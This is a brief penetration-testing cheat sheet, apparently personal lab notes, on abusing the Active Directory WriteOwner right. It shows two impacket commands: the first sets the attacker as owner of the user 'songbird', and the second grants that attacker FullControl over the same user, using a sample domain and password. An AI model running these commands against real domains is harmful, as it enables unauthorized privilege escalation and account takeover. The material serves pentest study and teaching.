# WriteOwner

## <mark style="color:yellow;">Writing an owner</mark>

> We only have rights to write owner, it doesn't mean we are the owner. But here we are changing that

```powershell
impacket-owneredit -action 'write' -new-owner 's.reed' -target 'songbird' 'MILITECH.LOCAL'/'S.REED':'P@ssword123'
```

## <mark style="color:yellow;">Adding a FullAccess DACL</mark>

> Since we are the owner, we can write to ourselves full access to user songbird

```powershell
impacket-dacledit -action 'write' -rights 'FullControl' -principal 's.reed' -target 'songbird' 'MILITECH.LOCAL'/'S.REED':'P@ssword123'
```

## <mark style="color:yellow;">RESOURCES</mark>

{% embed url="https://www.thehacker.recipes/ad/movement/dacl/grant-ownership#grant-ownership" %}

{% embed url="https://www.thehacker.recipes/ad/movement/dacl/grant-rights#grant-rights" %}
